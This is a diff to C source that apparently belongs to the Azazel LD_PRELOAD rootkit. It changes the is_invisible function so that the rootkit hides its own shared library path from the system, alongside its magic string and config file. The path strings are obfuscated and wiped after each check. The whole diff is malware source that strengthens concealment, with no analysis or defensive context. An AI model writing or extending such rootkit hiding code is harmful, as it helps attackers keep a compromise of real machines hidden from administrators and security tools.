@@ -160,16 +160,21 @@ int is_invisible(const char *path) {
 	char line[MAX_LEN];
 	char p_path[PATH_MAX];
 	char *config_file = strdup(CONFIG_FILE);
+    char *azazel_lib = strdup(AZAZEL_LIB);
 	FILE *cmd;	
 	int fd;
 	
 	init();
 
 	x(config_file);
-	if(strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
+    x(azazel_lib);
+
+	if(strstr(path, MAGIC_STRING) || strstr(path, config_file) || strstr(path, azazel_lib)) {
 		cleanup(config_file, strlen(config_file));
+        cleanup(azazel_lib, strlen(azazel_lib));
 		return 1;
 	}
+    cleanup(azazel_lib, strlen(azazel_lib));
 	char *proc_path = strdup(PROC_PATH);
 	x(proc_path);
 	if(strstr(path, proc_path)){
